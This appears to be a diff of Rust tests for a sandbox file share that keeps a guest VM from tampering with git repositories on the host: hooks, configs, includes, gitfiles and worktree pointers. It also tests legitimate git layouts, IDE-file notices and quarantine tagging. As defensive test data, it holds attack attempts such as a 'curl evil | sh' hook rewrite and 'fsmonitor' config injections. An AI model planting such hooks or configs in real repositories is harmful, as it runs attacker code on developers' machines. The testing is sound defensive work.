++        fs::create_dir_all(root.join("r/.git/modules/ownconfig")).unwrap();
++        fs::write(root.join("r/.git/modules/ownconfig/config.worktree"), b"[core]\n\tfsmonitor = x\n").unwrap();
++        fs::create_dir_all(root.join("r/.git/modules/ownhooks/hooks")).unwrap();
++    });
++    // The probe: build .git/modules/evil/config and hooks while evil holds no HEAD.
++    assert_eq!(share.md("r/.git/modules/evil"), 0);
++    assert_eq!(share.put("r/.git/modules/evil/config", evil.as_bytes()), EPERM, "the config create");
++    assert_eq!(share.lock_rename("r/.git/modules/evil/config", evil.as_bytes()), EPERM, "the config.lock rename");
++    assert_eq!(share.md("r/.git/modules/evil/hooks"), EPERM, "the hooks mkdir");
++    // The same through config.worktree.
++    assert_eq!(share.put("r/.git/modules/evil/config.worktree", evil.as_bytes()), EPERM);
++    assert_eq!(share.lock_rename("r/.git/modules/evil/config.worktree", evil.as_bytes()), EPERM);
++    assert!(fs::read_dir(share.root.join("r/.git/modules/evil")).unwrap().next().is_none(), "nothing reached the host");
++    // Then HEAD, objects and refs, and the gitfile: evil holds nothing the server did not admit.
++    assert_eq!(share.put("r/.git/modules/evil/HEAD", b"ref: refs/heads/main\n"), 0);
++    assert_eq!(share.md("r/.git/modules/evil/objects"), 0);
++    assert_eq!(share.md("r/.git/modules/evil/refs"), 0);
++    // With a pre-planted hooks and a non-admitted config: the HEAD create and the gitfile flush.
++    for own in ["own", "ownconfig", "ownhooks"] {
++        assert_eq!(share.put(&format!("r/.git/modules/{own}/HEAD"), b"ref: refs/heads/main\n"), EPERM, "{own}");
++        assert_eq!(share.ren("r/.git/modules/evil/HEAD", &format!("r/.git/modules/{own}/HEAD")), EPERM, "{own}");
++        assert!(!share.root.join(format!("r/.git/modules/{own}/HEAD")).exists());
++    }
++    assert_eq!(share.put("r/sub2/.git", b"gitdir: ../.git/modules/own\n"), EPERM, "the gitfile flush");
++    assert_eq!(fs::read(share.root.join("r/sub2/.git")).unwrap(), b"", "the host file stays empty");
++    assert_eq!(share.rewrite("r/sub2/.git", format!("gitdir: {GUEST}/r/.git/modules/ownhooks\n").as_bytes()), EPERM);
++    assert_eq!(share.rewrite("r/sub2/.git", b"gitdir: ../.git/modules/ownconfig\n"), EPERM);
++    assert_eq!(fs::read(share.root.join("r/sub2/.git")).unwrap(), b"");
++    // The same directory built in refs/ and logs/ of a planted HEAD: built freely (exempt), never a git
++    // directory (HEAD refused beside hooks or a non-admitted config) and never a pointer target.
++    for base in ["r/.git/refs/evil", "r/.git/logs/evil"] {
++        if base.contains("logs") {
++            assert_eq!(share.md("r/.git/logs"), 0);
++        }
++        assert_eq!(share.md(base), 0);
++        assert_eq!(share.put(&format!("{base}/config"), evil.as_bytes()), 0, "{base}");
++        assert_eq!(share.md(&format!("{base}/hooks")), 0, "{base}");
++        assert_eq!(share.put(&format!("{base}/HEAD"), b"ref: refs/heads/main\n"), EPERM, "{base}");
++        let target = base.trim_start_matches("r/");
++        assert_eq!(share.rewrite("r/sub2/.git", format!("gitdir: ../{target}\n").as_bytes()), EPERM, "{base}");
++    }
++    // HEAD first, then the rest, in an exempt directory: still never a pointer target.
++    assert_eq!(share.md("r/.git/refs/late"), 0);
++    assert_eq!(share.put("r/.git/refs/late/HEAD", b"ref: refs/heads/main\n"), 0);
++    assert_eq!(share.put("r/.git/refs/late/config", evil.as_bytes()), 0);
++    assert_eq!(share.put("r/sub3/.git", b"gitdir: ../.git/refs/late\n"), EPERM);
++    // commondir: the reviewer's variant through a worktree directory.
++    assert_eq!(share.md("r/.git/worktrees"), 0);
++    assert_eq!(share.md("r/.git/worktrees/w"), 0);
++    assert_eq!(share.put("r/.git/worktrees/w/commondir", b"../../modules/own\n"), EPERM);
++    assert_eq!(fs::read(share.root.join("r/.git/worktrees/w/commondir")).unwrap(), b"");
++    // A target under modules/ but inside a git directory's refs/ is never a pointer target.
++    assert_eq!(share.md("r/.git/modules/evil/refs/x"), 0);
++    assert_eq!(share.put("r/sub3/.git2", b""), 0);
++    assert_eq!(share.rewrite("r/sub2/.git", b"gitdir: ../.git/modules/evil/refs/x\n"), EPERM);
++    // The admitted evil directory: the gitfile is accepted, and nothing runs there.
++    assert_eq!(share.put("r/sub/.git", b"gitdir: ../.git/modules/evil\n"), 0);
++    assert_eq!(fs::read(share.root.join("r/sub/.git")).unwrap(), b"gitdir: ../.git/modules/evil\n");
++    assert!(!share.root.join("r/.git/modules/evil/config").exists() && !share.root.join("r/.git/modules/evil/hooks").exists());
++}
++
++#[test]
++fn r15_head_is_replaced_in_a_repository_with_hook_samples_but_never_added_beside_them() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("r"), PLAIN_CONFIG);
++        fs::create_dir(root.join("r/.git/hooks")).unwrap();
++        fs::write(root.join("r/.git/hooks/pre-commit.sample"), b"#!/bin/sh\n").unwrap();
++    });
++    // The Mac's own repositories carry hooks/*.sample; checking out a branch rewrites HEAD there.
++    assert_eq!(share.lock_rename("r/.git/HEAD", b"ref: refs/heads/other\n"), 0);
++    assert_eq!(fs::read(share.root.join("r/.git/HEAD")).unwrap(), b"ref: refs/heads/other\n");
++    // A commondir or gitdir is new there, so it is refused.
++    assert_eq!(share.put("r/.git/commondir", b".\n"), EPERM);
++    assert_eq!(share.put("r/.git/gitdir", b"x\n"), EPERM);
++}
++
++// ---- H3: pointer files ------------------------------------------------------------------------------------
++
++#[test]
++fn r15_pointer_files_naming_a_guest_made_repository_are_refused() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("r"), PLAIN_CONFIG);
++        // A repository the guest made (a clone): its .git is not below a modules/ or worktrees/.
++        plant_repo(&root.join("guestmade"), PLAIN_CONFIG);
++        fs::create_dir_all(root.join("r/.git/worktrees/w")).unwrap();
++        fs::write(root.join("r/.git/worktrees/w/HEAD"), b"ref: refs/heads/w\n").unwrap();
++        fs::create_dir(root.join("wt")).unwrap();
++        fs::create_dir(root.join("sub")).unwrap();
++        symlink("r/.git/worktrees/w", root.join("link")).unwrap();
++        // A gitfile inside a .git chain, and a modules/ directory that is not a worktrees/.
++        fs::create_dir_all(root.join("r/.git/modules/m")).unwrap();
++        fs::write(root.join("r/.git/modules/m/.git"), b"gitdir: x\n").unwrap();
++        fs::create_dir_all(root.join("r/.git/modules/q")).unwrap();
++    });
++    // A gitfile at a guest-made repository, by every spelling of its path.
++    for content in [
++        "gitdir: ../guestmade/.git\n".to_owned(),
++        format!("gitdir: {GUEST}/guestmade/.git\n"),
++        "gitdir: ../link\n".to_owned(),
++        "gitdir: /elsewhere/.git\n".to_owned(),
++        "gitdir: ~/.git\n".to_owned(),
++        "gitdir: ../../outside\n".to_owned(),
++        "gitdir: ../r/.git\n".to_owned(),
++        "gitdir: ../r/.git/worktrees/w\n\n".to_owned(),
++        "gitdir: ../r/.git/worktrees/w\r\n".to_owned(),
++        "gitdir:../r/.git/worktrees/w\n".to_owned(),
++        "../r/.git/worktrees/w\n".to_owned(),
++        "gitdir: \n".to_owned(),
++        "gitdir: ../missing/repo\n".to_owned(),
++        "gitdir: ../r/.git/missing\n".to_owned(),
++    ] {
++        assert_eq!(share.put("sub/.git", content.as_bytes()), EPERM, "{content:?}");
++        assert_eq!(fs::read(share.root.join("sub/.git")).unwrap(), b"", "{content:?}");
++        assert_eq!(share.rm("sub/.git"), 0);
++    }
++    // commondir and gitdir, each at a guest-made repository or out of place: refused at the flush, the
++    // host file left empty.
++    let refused = |share: &mut Share, path: &str, content: &[u8], why: &str| {
++        assert_eq!(share.put(path, content), EPERM, "{why}");
++        assert_eq!(fs::read(share.root.join(path)).unwrap(), b"", "{why}");
++        assert_eq!(share.rm(path), 0);
++    };
++    refused(&mut share, "r/.git/worktrees/w/commondir", b"../../../../guestmade/.git\n", "a guest-made repository");
++    refused(&mut share, "r/.git/worktrees/w/commondir", b"../../worktrees\n", "not the common directory");
++    refused(&mut share, "r/.git/worktrees/w/gitdir", b"../../../../guestmade/.git/config\n", "not a gitfile");
++    refused(&mut share, "r/.git/worktrees/w/gitdir", b"../../../../guestmade/.git\n", "a directory, not a gitfile");
++    refused(&mut share, "r/.git/worktrees/w/gitdir", b"../../modules/m/.git\n", "a .git file inside a .git chain");
++    refused(&mut share, "r/.git/worktrees/w/gitdir", b"../../modules/q/.git\n", "a missing .git inside a .git chain");
++    refused(&mut share, "r/.git/worktrees/w/gitdir", b"../../../../wt/notgit\n", "not named .git");
++    refused(&mut share, "r/.git/worktrees/w/gitdir", b"../../../../link/.git\n", "through a link");
++    // Valid content in the wrong place: a git directory's modules/<name>/, not its worktrees/<name>/.
++    refused(&mut share, "r/.git/modules/m/commondir", b"../..\n", "commondir outside worktrees/<name>");
++    refused(&mut share, "r/.git/modules/m/gitdir", format!("{GUEST}/wt/.git\n").as_bytes(), "gitdir outside worktrees/<name>");
++    assert_eq!(share.put("r/.git/x", b""), 0);
++    assert_eq!(share.md("r/.git/y"), 0);
++    refused(&mut share, "r/.git/y/commondir", b"..\n", "commondir outside worktrees/<name>");
++    // Accepted: exactly what `git worktree add` writes.
++    assert_eq!(share.put("r/.git/worktrees/w/commondir", b"../..\n"), 0);
++    assert_eq!(share.put("r/.git/worktrees/w/gitdir", format!("{GUEST}/wt/.git\n").as_bytes()), 0);
++    assert_eq!(share.put("wt/.git", format!("gitdir: {GUEST}/r/.git/worktrees/w\n").as_bytes()), 0);
++    assert_eq!(fs::read(share.root.join("wt/.git")).unwrap(), format!("gitdir: {GUEST}/r/.git/worktrees/w\n").as_bytes());
++    // A rewrite is checked like a create; a refused one leaves the checked content.
++    assert_eq!(share.rewrite("wt/.git", b"gitdir: ../guestmade/.git\n"), EPERM);
++    assert_eq!(fs::read(share.root.join("wt/.git")).unwrap(), format!("gitdir: {GUEST}/r/.git/worktrees/w\n").as_bytes());
++    // More than 4 KiB is refused at the write.
++    let node = share.at("wt/.git");
++    let fh = share.open_ok(node, WRONLY);
++    assert_eq!(share.write(node, fh, 0, &[b'a'; POINTER_MAX + 1]).error, EPERM);
++    assert_eq!(share.setattr_fh(node, fh, FATTR_SIZE, 0, POINTER_MAX as u64 + 1).error, EPERM);
++    share.release(node, fh);
++    // Never a link, a hard link, a rename onto one or another type with these names.
++    assert_eq!(share.sym("sub/.git", "../r/.git"), EPERM);
++    assert_eq!(share.put("plain", b"gitdir: ../r/.git/worktrees/w\n"), 0);
++    assert_eq!(share.hard("plain", "sub/.git"), EPERM);
++    assert_eq!(share.ren("plain", "sub/.git"), EPERM);
++    assert_eq!(share.ren("plain", "wt/.git"), EPERM);
++    assert_eq!(share.hard("wt/.git", "plain2"), EPERM);
++    assert_eq!(share.md("r/.git/worktrees/w/gitdir2"), 0);
++    assert_eq!(share.md("r/.git/worktrees/x"), 0);
++    assert_eq!(share.md("r/.git/worktrees/x/commondir"), EPERM);
++    assert_eq!(share.sym("r/.git/worktrees/x/gitdir", "../w/gitdir"), EPERM);
++    // A truncate without the pointer's own handle.
++    let node = share.at("wt/.git");
++    assert_eq!(share.setattr(node, FATTR_SIZE, 0, 0).error, EPERM);
++    let body = FallocateIn { fh: 0, offset: 0, length: 1, mode: 0, padding: 0 };
++    assert_eq!(share.call(Opcode::Fallocate, node, body.as_slice()).error, EPERM);
++}
++
++#[test]
++fn r15_a_config_that_is_not_a_regular_file_is_never_replaced() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("r"), PLAIN_CONFIG);
++        fs::rename(root.join("r/.git/config"), root.join("r/real-config")).unwrap();
++        symlink("../real-config", root.join("r/.git/config")).unwrap();
++    });
++    assert_eq!(share.lock_rename("r/.git/config", PLAIN_CONFIG.as_bytes()), EPERM);
++    assert!(fs::symlink_metadata(share.root.join("r/.git/config")).unwrap().file_type().is_symlink());
++}
++
++#[test]
++fn r15_a_protected_node_is_held_by_identity_through_any_other_name() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("r"), PLAIN_CONFIG);
++        // The user's own hard link to the repository's config, outside the zone.
++        fs::hard_link(root.join("r/.git/config"), root.join("r/config-link")).unwrap();
++    });
++    share.at("r/.git/config");
++    assert_eq!(share.open_w("r/config-link"), EPERM);
++    assert_eq!(share.rm("r/config-link"), EPERM);
++    assert_eq!(fs::read_to_string(share.root.join("r/.git/config")).unwrap(), PLAIN_CONFIG);
++}
++
++// ---- the layouts git itself makes: clone, worktree add, submodule update ------------------------------
++
++#[test]
++fn r15_a_clone_a_worktree_add_and_a_submodule_update_succeed() {
++    // Reference layouts from the host's own git, in a separate temporary tree.
++    let reference = TempTree::new();
++    let home = reference.0.clone();
++    host_git(&home, &home, &["init", "-q", "up"]);
++    fs::write(home.join("up/f.txt"), b"upstream\n").unwrap();
++    host_git(&home, &home.join("up"), &["add", "f.txt"]);
++    host_git(&home, &home.join("up"), &["commit", "-q", "-m", "one"]);
++    let head = text(&host_git(&home, &home.join("up"), &["rev-parse", "HEAD"]));
++    host_git(&home, &home, &["clone", "-q", "up", "clone"]);
++    host_git(&home, &home, &["clone", "-q", "up", "sup"]);
++    host_git(&home, &home.join("sup"), &["worktree", "add", "-q", "-b", "wt", "../wt"]);
++    host_git(&home, &home.join("sup"), &["submodule", "add", "-q", "../up", "sub"]);
++    let r = |p: &str| fs::read(home.join(p)).unwrap();
++
++    let mut share = folder_at_host_path();
++    let guest = share.root.to_str().unwrap().to_owned();
++    // 1. A clone, in git's order: .git, config through config.lock, HEAD, refs/, objects/, the rest.
++    assert_eq!(share.md("sup"), 0);
++    assert_eq!(share.md("sup/.git"), 0);
++    assert_eq!(share.lock_rename("sup/.git/config", PLAIN_CONFIG.as_bytes()), 0);
++    // git's core.symlinks probe: a link named t + six characters to `testing`, removed at once.
++    assert_eq!(share.sym("sup/.git/tNLq77W", "testing"), 0);
++    assert_eq!(share.rm("sup/.git/tNLq77W"), 0);
++    assert_eq!(share.put("sup/.git/HEAD", b"ref: refs/heads/main\n"), 0);
++    assert_eq!(share.lock_rename("sup/.git/config", &r("clone/.git/config")), 0);
++    for dir in ["objects", "refs", "logs"] {
++        assert_eq!(share.md(&format!("sup/.git/{dir}")), 0);
++        share.copy_in(&home.join("clone/.git").join(dir), &format!("sup/.git/{dir}"));
++    }
++    if home.join("clone/.git/packed-refs").exists() {
++        assert_eq!(share.lock_rename("sup/.git/packed-refs", &r("clone/.git/packed-refs")), 0);
++    }
++    assert_eq!(share.put("sup/.git/index", &r("clone/.git/index")), 0);
++    assert_eq!(share.lock_rename("sup/.git/HEAD", &r("clone/.git/HEAD")), 0);
++    assert_eq!(share.put("sup/f.txt", b"upstream\n"), 0);
++    let sup = share.root.join("sup");
++    assert_eq!(text(&host_git(&home, &sup, &["rev-parse", "HEAD"])), head);
++    assert_eq!(text(&host_git(&home, &sup, &["status", "--porcelain"])), "");
++
++    // 2. git worktree add -b wt ../wt, in git's order (gitdir, gitfile, commondir, HEAD).
++    assert_eq!(share.lock_rename("sup/.git/refs/heads/wt", format!("{head}\n").as_bytes()), 0);
++    assert_eq!(share.md("sup/.git/worktrees"), 0);
++    assert_eq!(share.md("sup/.git/worktrees/wt"), 0);
++    assert_eq!(share.put("sup/.git/worktrees/wt/locked", b"initializing\n"), 0);
++    assert_eq!(share.md("wt"), 0);
++    assert_eq!(share.put("sup/.git/worktrees/wt/gitdir", format!("{guest}/wt/.git\n").as_bytes()), 0);
++    assert_eq!(share.put("wt/.git", format!("gitdir: {guest}/sup/.git/worktrees/wt\n").as_bytes()), 0);
++    assert_eq!(share.put("sup/.git/worktrees/wt/commondir", b"../..\n"), 0);
++    assert_eq!(share.md("sup/.git/worktrees/wt/refs"), 0);
++    assert_eq!(share.lock_rename("sup/.git/worktrees/wt/HEAD", b"ref: refs/heads/wt\n"), 0);
++    assert_eq!(share.md("sup/.git/worktrees/wt/logs"), 0);
++    assert_eq!(share.put("sup/.git/worktrees/wt/logs/HEAD", b"\n"), 0);
++    assert_eq!(share.rm("sup/.git/worktrees/wt/locked"), 0);
++    assert_eq!(share.put("sup/.git/worktrees/wt/index", &r("sup/.git/worktrees/wt/index")), 0);
++    assert_eq!(share.put("wt/f.txt", b"upstream\n"), 0);
++    let wt = share.root.join("wt");
++    assert_eq!(text(&host_git(&home, &wt, &["rev-parse", "--abbrev-ref", "HEAD"])), "wt");
++    assert_eq!(text(&host_git(&home, &wt, &["status", "--porcelain"])), "");
++
++    // 3. git submodule update (add): the gitfile first, at a git directory still to be made; the
++    //    submodule's own config through the lock, core.worktree last; the gitfile rewritten relative.
++    assert_eq!(share.md("sup/.git/modules"), 0);
++    assert_eq!(share.md("sup/sub"), 0);
++    assert_eq!(share.put("sup/sub/.git", format!("gitdir: {guest}/sup/.git/modules/sub\n").as_bytes()), 0);
++    assert_eq!(share.md("sup/.git/modules/sub"), 0);
++    assert_eq!(share.lock_rename("sup/.git/modules/sub/config", PLAIN_CONFIG.as_bytes()), 0);
++    assert_eq!(share.put("sup/.git/modules/sub/HEAD", b"ref: refs/heads/main\n"), 0);
++    for dir in ["objects", "refs", "logs"] {
++        assert_eq!(share.md(&format!("sup/.git/modules/sub/{dir}")), 0);
++        share.copy_in(&home.join("sup/.git/modules/sub").join(dir), &format!("sup/.git/modules/sub/{dir}"));
++    }
++    if home.join("sup/.git/modules/sub/packed-refs").exists() {
++        assert_eq!(share.lock_rename("sup/.git/modules/sub/packed-refs", &r("sup/.git/modules/sub/packed-refs")), 0);
++    }
++    let module_config = String::from_utf8(r("sup/.git/modules/sub/config")).unwrap();
++    assert!(module_config.contains("worktree = ../../../sub"), "git writes core.worktree for a submodule");
++    let without: String = module_config.lines().filter(|l| !l.contains("worktree")).map(|l| format!("{l}\n")).collect();
++    assert_eq!(share.lock_rename("sup/.git/modules/sub/config", without.as_bytes()), 0);
++    assert_eq!(share.lock_rename("sup/.git/modules/sub/config", module_config.as_bytes()), 0);
++    assert_eq!(share.lock_rename("sup/.git/modules/sub/HEAD", &r("sup/.git/modules/sub/HEAD")), 0);
++    assert_eq!(share.rewrite("sup/sub/.git", b"gitdir: ../.git/modules/sub\n"), 0);
++    assert_eq!(share.put("sup/.git/modules/sub/index", &r("sup/.git/modules/sub/index")), 0);
++    assert_eq!(share.put("sup/sub/f.txt", b"upstream\n"), 0);
++    assert_eq!(share.lock_rename("sup/.git/config", &r("sup/.git/config")), 0);
++    assert_eq!(share.lock_rename("sup/.gitmodules", &r("sup/.gitmodules")), 0);
++    assert_eq!(share.lock_rename("sup/.git/index", &r("sup/.git/index")), 0);
++    let sub = share.root.join("sup/sub");
++    assert_eq!(fs::read(sub.join(".git")).unwrap(), b"gitdir: ../.git/modules/sub\n");
++    assert_eq!(text(&host_git(&home, &sub, &["rev-parse", "HEAD"])), head);
++    assert_eq!(text(&host_git(&home, &sub, &["status", "--porcelain"])), "");
++    host_git(&home, &sup, &["submodule", "status"]);
++    assert!(share.notices().is_empty(), "nothing was refused");
++}
++
++// ---- T17b: repository-tracked hooks and include targets ----------------------------------------------
++
++#[test]
++fn r15_husky_v9_hooks_are_refused_without_ever_looking_up_dot_git() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("app"), &format!("{PLAIN_CONFIG}\thooksPath = .husky/_\n"));
++        fs::create_dir_all(root.join("app/.husky/_")).unwrap();
++        fs::write(root.join("app/.husky/_/h"), b"#!/bin/sh\n. \"$(dirname \"$0\")/../$(basename \"$0\")\"\n").unwrap();
++        fs::write(root.join("app/.husky/_/pre-commit"), b"#!/bin/sh\n. \"$(dirname \"$0\")/h\"\n").unwrap();
++        fs::write(root.join("app/.husky/pre-commit"), b"npm test\n").unwrap();
++        fs::write(root.join("app/.husky/notes.md"), b"notes\n").unwrap();
++    });
++    // The guest goes straight for .husky/pre-commit.
++    assert_eq!(share.open_w("app/.husky/pre-commit"), EPERM);
++    assert_eq!(share.rewrite("app/.husky/pre-commit", b"curl evil | sh\n"), EPERM);
++    let hook = share.at("app/.husky/pre-commit");
++    assert_eq!(share.setattr(hook, FATTR_MODE, 0o755, 0).error, EPERM);
++    assert_eq!(share.rm("app/.husky/pre-commit"), EPERM);
++    assert_eq!(share.ren("app/.husky/pre-commit", "app/.husky/x"), EPERM);
++    // A hook that does not exist yet.
++    assert_eq!(share.put("app/.husky/pre-push", b"evil\n"), EPERM);
++    assert_eq!(share.put("app/.husky/post-checkout", b"evil\n"), EPERM);
++    assert_eq!(share.sym("app/.husky/commit-msg", "/bin/sh"), EPERM);
++    assert_eq!(share.put("app/.husky/elsewhere", b"x\n"), 0);
++    assert_eq!(share.ren("app/.husky/elsewhere", "app/.husky/pre-rebase"), EPERM);
++    // The hooksPath tree itself.
++    assert_eq!(share.open_w("app/.husky/_/h"), EPERM);
++    assert_eq!(share.put("app/.husky/_/pre-push", b""), EPERM);
++    assert!(!share.root.join("app/.husky/_/pre-push").exists());
++    assert_eq!(share.rd("app/.husky/_"), EPERM);
++    // Ancestors cannot be moved out from under the names.
++    assert_eq!(share.ren("app/.husky", "app/husky-old"), EPERM);
++    assert_eq!(share.ren("app", "app2"), EPERM);
++    // Ordinary files beside them stay ordinary work.
++    assert_eq!(share.rewrite("app/.husky/notes.md", b"more notes\n"), 0);
++    assert_eq!(fs::read(share.root.join("app/.husky/pre-commit")).unwrap(), b"npm test\n");
++    // Removing core.hooksPath is allowed, but the tracked set never shrinks within an incarnation (the
++    // user's next `npm install` would put it back).
++    assert_eq!(share.lock_rename("app/.git/config", PLAIN_CONFIG.as_bytes()), 0);
++    assert_eq!(share.open_w("app/.husky/pre-commit"), EPERM);
++    assert_eq!(share.put("app/.husky/pre-push", b"evil\n"), EPERM);
++    assert_eq!(share.notices(), vec![NoticeKind::GitProtected]);
++}
++
++#[test]
++fn r15_plain_hooks_paths_relative_absolute_and_not_yet_existing() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("a"), &format!("{PLAIN_CONFIG}\thooksPath = githooks\n"));
++        fs::create_dir(root.join("a/githooks")).unwrap();
++        fs::write(root.join("a/githooks/pre-commit"), b"lint\n").unwrap();
++        plant_repo(&root.join("b"), &format!("{PLAIN_CONFIG}\thooksPath = {GUEST}/b/tools/hooks\n"));
++        plant_repo(&root.join("c"), &format!("{PLAIN_CONFIG}\thooksPath = ~/global-hooks\n"));
++        fs::create_dir(root.join("c/global-hooks")).unwrap();
++    });
++    assert_eq!(share.open_w("a/githooks/pre-commit"), EPERM);
++    assert_eq!(share.put("a/githooks/pre-push", b""), EPERM);
++    assert!(!share.root.join("a/githooks/pre-push").exists());
++    assert_eq!(share.ren("a/githooks", "a/hooks-old"), EPERM);
++    // An absolute hooksPath under the guest mount path whose directory does not exist yet.
++    assert_eq!(share.md("b/tools"), 0);
++    assert_eq!(share.md("b/tools/hooks"), EPERM);
++    assert_eq!(share.put("b/tools/hooks", b"x"), EPERM);
++    assert_eq!(share.md("b/tools/other"), 0);
++    assert_eq!(share.ren("b/tools/other", "b/tools/hooks"), EPERM);
++    assert_eq!(share.md("b/elsewhere"), 0);
++    assert_eq!(share.md("b/elsewhere/hooks"), 0);
++    assert_eq!(share.ren("b/elsewhere", "b/tools2"), 0);
++    // An ancestor of the target cannot be renamed away.
++    assert_eq!(share.ren("b/tools", "b/tools3"), EPERM);
++    // A home-relative path is outside the share: nothing here is tracked for it.
++    assert_eq!(share.put("c/global-hooks/pre-commit", b"x"), 0);
++}
++
++#[test]
++fn r15_include_targets_nested_with_every_include_if_kind_and_not_yet_existing() {
++    let config = format!(
++        "{PLAIN_CONFIG}[include]\n\tpath = conf/a.inc\n[includeIf \"gitdir:~/work/\"]\n\tpath = conf/gitdir.inc\n[includeIf \"gitdir/i:/x/\"]\n\tpath = conf/gitdir-i.inc\n[includeIf \"onbranch:main\"]\n\tpath = conf/onbranch.inc\n[includeIf \"hasconfig:remote.*.url:https://example.invalid/**\"]\n\tpath = {GUEST}/repo/conf/hasconfig.inc\n[include]\n\tpath = ~/.gitconfig-extra\n\tpath = /etc/gitconfig-extra\n"
++    );
++    let mut share = folder(|root| {
++        plant_repo(&root.join("repo"), &config);
++        fs::create_dir_all(root.join("repo/.git/conf")).unwrap();
++        fs::write(root.join("repo/.git/conf/a.inc"), b"[include]\n\tpath = b.inc\n").unwrap();
++        fs::write(root.join("repo/.git/conf/b.inc"), b"[include]\n\tpath = ../../nested/c.inc\n[core]\n\thooksPath = hooks-from-include\n").unwrap();
++        fs::create_dir(root.join("repo/nested")).unwrap();
++        fs::create_dir(root.join("repo/conf")).unwrap();
++        fs::write(root.join("repo/conf/hasconfig.inc"), b"").unwrap();
++    });
++    // The include resolves relative to the including file (.git/conf/...), nested to b.inc and c.inc.
++    assert_eq!(share.open_w("repo/.git/conf/a.inc"), EPERM);
++    assert_eq!(share.open_w("repo/.git/conf/b.inc"), EPERM);
++    assert_eq!(share.put("repo/nested/c.inc", b"[core]\n\tfsmonitor = x\n"), EPERM, "a missing nested target");
++    for name in ["gitdir.inc", "gitdir-i.inc", "onbranch.inc"] {
++        assert_eq!(share.put(&format!("repo/.git/conf/{name}"), b"[core]\n\tfsmonitor = x\n"), EPERM, "{name}");
++    }
++    assert_eq!(share.open_w("repo/conf/hasconfig.inc"), EPERM);
++    assert_eq!(share.md("repo/hooks-from-include"), EPERM, "a hooksPath set by an include");
++    // Outside the share (home, /etc): out of the guest's reach, nothing tracked here.
++    assert_eq!(share.put("repo/.gitconfig-extra", b"x"), 0);
++    assert_eq!(share.put("repo/conf/other.inc", b"x"), 0);
++    assert_eq!(share.ren("repo/nested", "repo/nested2"), EPERM, "an ancestor of a target");
++}
++
++#[test]
++fn r15_a_missing_non_ascii_target_refuses_every_non_ascii_spelling() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("r"), &format!("{PLAIN_CONFIG}[include]\n\tpath = ../inc/caf\u{e9}.inc\n"));
++        fs::create_dir(root.join("r/inc")).unwrap();
++    });
++    if !insensitive(&share) {
++        return;
++    }
++    assert_eq!(share.put("r/inc/caf\u{e9}.inc", b"x"), EPERM);
++    assert_eq!(share.put("r/inc/cafe\u{301}.inc", b"x"), EPERM, "the decomposed spelling");
++    assert_eq!(share.put("r/inc/CAF\u{c9}.INC", b"x"), EPERM);
++    assert_eq!(share.put("r/inc/cafe.inc", b"x"), 0, "an ASCII name cannot alias it");
++}
++
++// ---- T18, T19: watched names ---------------------------------------------------------------------------
++
++#[test]
++fn r15_watched_names_are_allowed_and_reported_once_per_kind() {
++    let mut share = folder(|root| {
++        fs::create_dir_all(root.join("p/.vscode")).unwrap();
++        fs::create_dir_all(root.join("p/.idea/runConfigurations/nested")).unwrap();
++        fs::write(root.join("p/.envrc"), b"use nix\n").unwrap();
++    });
++    assert_eq!(share.rewrite("p/.envrc", b"source_up\n"), 0);
++    assert_eq!(share.put("q.envrc", b""), 0);
++    assert_eq!(share.put("p/.ENVRC2", b""), 0);
++    assert_eq!(share.notices(), vec![NoticeKind::Envrc]);
++    assert_eq!(share.put("p/.vscode/tasks.json", b"{}"), 0);
++    assert_eq!(share.put("p/.vscode/settings.json", b"{}"), 0);
++    assert_eq!(share.put("p/w.code-workspace", b"{}"), 0);
++    assert_eq!(share.put("p/.idea/workspace.xml", b"<x/>"), 0);
++    assert_eq!(share.rewrite("p/.vscode/tasks.json", b"{\"runOn\": \"folderOpen\"}"), 0);
++    assert_eq!(
++        share.notices(),
++        vec![NoticeKind::VscodeTasks, NoticeKind::VscodeSettings, NoticeKind::CodeWorkspace, NoticeKind::IdeaProject]
++    );
++    assert!(share.notices().is_empty());
++    assert_eq!(fs::read(share.root.join("p/.vscode/tasks.json")).unwrap(), b"{\"runOn\": \"folderOpen\"}");
++    // Anything below .idea/runConfigurations, at any depth, in a fresh incarnation.
++    let mut fresh = folder(|root| fs::create_dir_all(root.join("p/.idea/runConfigurations/nested")).unwrap());
++    assert_eq!(fresh.put("p/.idea/runConfigurations/nested/run", b"<x/>"), 0);
++    assert_eq!(fresh.notices(), vec![NoticeKind::IdeaProject]);
++    // The sink is bounded: one entry per kind, then nothing more in this incarnation.
++    let sink = ShareNotices::default();
++    for _ in 0..3 {
++        for kind in NoticeKind::ALL {
++            sink.push(kind);
++        }
++    }
++    assert_eq!(sink.drain(), NoticeKind::ALL.to_vec());
++    sink.push(NoticeKind::Envrc);
++    assert!(sink.drain().is_empty());
++    assert_eq!(NOTICE_CAPACITY, 6);
++    assert_eq!(
++        NoticeKind::ALL.map(NoticeKind::wire),
++        ["git_protected", "envrc", "vscode_tasks", "vscode_settings", "code_workspace", "idea_project"]
++    );
++}
++
++#[test]
++fn r15_applies_only_to_read_write_folder_sources() {
++    for flags in [flags(false, true), flags(false, false)] {
++        let mut share = Share::build(flags, |root| plant_repo(&root.join("r"), PLAIN_CONFIG));
++        assert_eq!(share.md("r/.git/hooks"), 0);
++        assert_eq!(share.put("r/.git/hooks/pre-commit", b"x"), 0);
++        assert!(share.fs().lock().git.is_none());
++        assert!(share.notices().is_empty());
++    }
++    let mut share = Share::build(ShareFlags { read_only: true, winter_share: false, folder_rules: true }, |root| plant_repo(&root.join("r"), PLAIN_CONFIG));
++    assert!(share.fs().lock().git.is_none());
++    assert_eq!(share.md("r/.git/hooks"), lx::EROFS);
++}
++
++// ---- R16: quarantine on guest-created files (T20) ------------------------------------------------------
++
++#[test]
++fn r16_every_create_and_mkdir_is_tagged_on_every_read_write_share() {
++    for flags in [FOLDER, flags(false, true), flags(false, false)] {
++        let mut share = Share::new(flags);
++        assert_eq!(share.put("tool", b"#!/bin/sh\n"), 0);
++        assert_eq!(share.md("App.app"), 0);
++        assert_eq!(share.md("App.app/Contents"), 0);
++        assert_eq!(share.put("App.app/Contents/run.command", b"x"), 0);
++        for path in ["tool", "App.app", "App.app/Contents", "App.app/Contents/run.command"] {
++            assert_tagged(&share.root.join(path));
++        }
++    }
++    assert_eq!(quarantine::value_at(0x1234), "0081;00001234;Winter Cowork;");
